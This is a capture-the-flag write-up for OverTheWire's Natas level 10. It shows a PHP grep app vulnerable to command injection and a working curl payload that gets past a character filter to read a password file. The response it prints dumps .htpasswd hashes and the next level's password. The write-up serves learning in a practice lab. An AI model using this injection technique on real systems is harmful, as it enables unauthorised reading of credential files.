# BANDIT LEVEL 10

```
http://overthewire.org/wargames/natas/natas10.html
```

```
Username: natas10
Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
URL:      http://natas10.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

In this version of the dictionary grep app, we are warned that "For security
reasons, we now filter on certain characters". Let's examine the source..

```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

We see the check with `preg_match()` function against the `;`, `|` and `&`
characters to prevent us from terminating commands and appending our own in the
call to `passthru()`..  so we need to find a way to work with the `grep`
command to dump the contents of the password file.

In the previous level, we tried feeding the `grep` command the pattern `.*` to
dump the entire contents of `dictionary.txt`. What if we use the same command,
but instead use it to dump our password file by providing the input
`.* /etc/natas_webpass/natas11`? We can append a `#` at the end to mask out the
trailing `dictionary.txt` to avoid dumping that file as well by rendering it a
comment. So our `passthru()` should become..

```
  passthru("grep -i .* /etc/natas_webpass/natas11 # dictionary.txt");
```

```
$ curl 'http://natas10.natas.labs.overthewire.org/?needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search' -H 'Authorization: Basic bmF0YXMxMDpuT3BwMWlnUUFrVXphSTFHVVVqem4xYkZWajd4Q056dQ=='
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
